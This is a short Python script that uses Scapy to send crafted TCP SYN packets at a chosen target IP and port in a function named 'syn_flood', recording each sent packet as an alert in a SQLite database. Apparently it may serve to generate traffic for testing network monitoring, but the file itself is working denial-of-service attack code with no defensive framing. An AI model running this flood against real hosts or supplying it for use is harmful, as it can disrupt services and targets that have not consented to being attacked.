from scapy.all import IP, TCP, send
import time
import sqlite3

DB_NAME = "network_logs.db"

def insert_alert(timestamp, alert_type, message):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO alerts (timestamp, type, message) VALUES (?, ?, ?)",
              (timestamp, alert_type, message))
    conn.commit()
    conn.close()

def log_event(message):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    insert_alert(timestamp, "SYN_FLOOD", message)
    print(message)

def syn_flood(target_ip, target_port, packet_count=100):
    log_event(f"Starting SYN flood on {target_ip}:{target_port} at {time.strftime('%Y-%m-%d %H:%M:%S')}...")
    for i in range(packet_count):
        packet = IP(dst=target_ip) / TCP(sport=12345 + i, dport=target_port, flags="S")
        send(packet, verbose=False)
        log_event(f"Packet sent during SYN flood attack: {packet.summary()}")
    log_event(f"SYN flood completed at {time.strftime('%Y-%m-%d %H:%M:%S')}.")
